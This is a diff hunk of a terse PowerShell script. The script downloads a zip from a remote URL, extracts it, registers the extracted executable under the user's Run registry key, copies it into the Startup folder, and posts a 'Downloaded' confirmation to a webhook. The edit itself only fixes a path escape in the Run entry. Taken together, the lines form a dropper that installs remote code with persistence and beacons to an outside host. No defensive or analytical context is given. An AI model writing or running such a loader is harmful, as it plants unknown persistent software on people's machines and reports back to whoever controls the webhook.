@@ -6,7 +6,7 @@ $z="$d\\t.zip"
 Invoke-WebRequest -Uri $u -OutFile $z -UseBasicParsing
 Expand-Archive -Path $z -DestinationPath $d -Force
 Remove-Item $z -Force
-Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $r -Value "$d\\$e" -Force
+Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name $r -Value "$d\$e" -Force
 $s = [Environment]::GetFolderPath("Startup")
 Copy-Item "$d\\$e" -Destination $s -Force
 Invoke-RestMethod -Uri $w -Method Post -Body (@{content="Downloaded"}|ConvertTo-Json) -ContentType 'application/json'|Out-Null
